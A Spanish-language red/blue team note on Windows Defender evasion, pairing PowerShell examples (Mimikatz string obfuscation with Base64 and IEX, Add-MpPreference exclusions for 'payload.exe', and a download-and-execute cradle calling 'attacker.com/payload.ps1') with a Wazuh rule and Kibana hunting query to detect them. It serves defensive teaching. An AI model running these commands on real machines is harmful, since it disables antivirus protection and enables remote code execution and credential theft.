# Defender Evasion — Técnicas documentadas

**Táctica MITRE:** Defense Evasion  
**Técnica:** T1562.001 + T1027 — Impair Defenses + Obfuscated Files  
**Severidad:** Alta  
**Contexto:** Operaciones Red Team en entornos Windows  

---

## 1. Cómo escanea Windows Defender

Defender usa múltiples capas de detección:

```
┌─────────────────────────────────────────────────────┐
│              Windows Defender                       │
│                                                     │
│  1. Signature scan   → hash / strings conocidas     │
│  2. Heuristic scan   → comportamiento sospechoso    │
│  3. AMSI             → scripts en memoria           │
│  4. Cloud protection → envía samples a MS           │
│  5. Behavioral       → acciones post-ejecución      │
└─────────────────────────────────────────────────────┘
```

Entender cada capa permite saber **cuál bypassear** según el escenario.

---

## 2. Técnica 1 — Obfuscación de strings (evadir signatures)

### Concepto

Defender busca strings conocidas (firmas) en archivos y memoria. Si fragmentamos o transformamos esas strings, la firma no matchea.

### Ejemplo: Mimikatz

```powershell
# Detectado por Defender — string "mimikatz" en el binario
Invoke-Mimikatz

# Técnica: concatenación de strings
$a = "Invoke-" + "Mimi" + "katz"
& $a

# Técnica: Base64 encode/decode
$encoded = "SW52b2tlLU1pbWlrYXR6"  # "Invoke-Mimikatz" en Base64
IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded)))

# Técnica: char array
$cmd = [char]73+[char]110+[char]118+[char]111+[char]107+[char]101  # "Invoke"
```

> **Importante:** Estas técnicas evaden detección por **firma estática**. Un EDR moderno con análisis de comportamiento las detectará igual.

---

## 3. Técnica 2 — Exclusiones de Defender

### Concepto

Defender permite excluir rutas, procesos y extensiones del escaneo. Si el atacante tiene privilegios, puede agregar exclusiones para su payload.

```powershell
# Agregar exclusión de ruta (requiere admin)
Add-MpPreference -ExclusionPath "C:\Users\Public\Tools"

# Agregar exclusión de proceso
Add-MpPreference -ExclusionProcess "payload.exe"

# Agregar exclusión de extensión
Add-MpPreference -ExclusionExtension ".bin"
```

### Detección

```xml
<!-- Wazuh: modificación de exclusiones de Defender -->
<rule id="100080" level="14">
  <if_group>windows_security</if_group>
  <field name="win.eventdata.scriptBlockText" type="pcre2">
    (?i)(Add-MpPreference.*Exclusion|Set-MpPreference.*Disable)
  </field>
  <description>ALTA: Modificación de exclusiones o configuración de Windows Defender</description>
  <mitre>
    <id>T1562.001</id>
  </mitre>
  <group>defender_tamper,defense_evasion</group>
</rule>
```

---

## 4. Técnica 3 — Payload en memoria (fileless)

### Concepto

Si el payload nunca toca el disco, Defender no puede escanearlo con su motor de firma de archivos. Solo AMSI (ya bypasseado) y el motor de comportamiento quedan activos.

```powershell
# Descargar y ejecutar en memoria sin tocar disco
$url = "http://attacker.com/payload.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)

# Alternativa con Invoke-WebRequest
IEX (iwr $url -UseBasicParsing).Content
```

### Por qué esto conecta con el soc-lab

Este es exactamente el patrón del **Case 001 (PowerShell EncodedCommand)** y **Case 002 (certutil download)**. La detección en Wazuh mediante Script Block Logging captura el contenido aunque sea fileless.

---

## 5. Detección desde el Blue Team

### Lo que Script Block Logging registra siempre

```
Event ID 4104 registra:
✅ Add-MpPreference con exclusiones
✅ Set-MpPreference con Disable*
✅ IEX + DownloadString (download cradle)
✅ strings de Mimikatz post-deobfuscación
✅ AMSI bypass strings
```

### Hunting query en Kibana

```
event.code: "4104" AND (
  winlog.event_data.ScriptBlockText: "*Add-MpPreference*Exclusion*" OR
  winlog.event_data.ScriptBlockText: "*Set-MpPreference*Disable*" OR
  winlog.event_data.ScriptBlockText: "*DownloadString*IEX*"
)
```

---

## 6. Conclusión: por qué el hardening defensivo importa

| Bypass | Funciona sin hardening | Funciona con hardening |
|--------|----------------------|----------------------|
| String obfuscation | ✅ Sí | ⚠️ Parcialmente (AMSI ve post-deobf) |
| Exclusión de Defender | ✅ Sí (con admin) | ✅ Sí — pero queda en Script Block Log |
| Fileless payload | ✅ Sí | ❌ No — AMSI + Script Block Log |
| AMSI bypass | ✅ Sí | ❌ No — Script Block Log detecta el bypass |

**La conclusión:** el hardening de PowerShell Logging (Case 001 del soc-lab) es la defensa más efectiva contra la mayoría de técnicas de evasión de Defender.

---

## 🔗 Referencias

- [MITRE T1562.001](https://attack.mitre.org/techniques/T1562/001/)
- [MITRE T1027](https://attack.mitre.org/techniques/T1027/)
- [Defender Evasion Research — ired.team](https://www.ired.team/offensive-security/defense-evasion)
- [PowerShell Logging — Microsoft](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging)
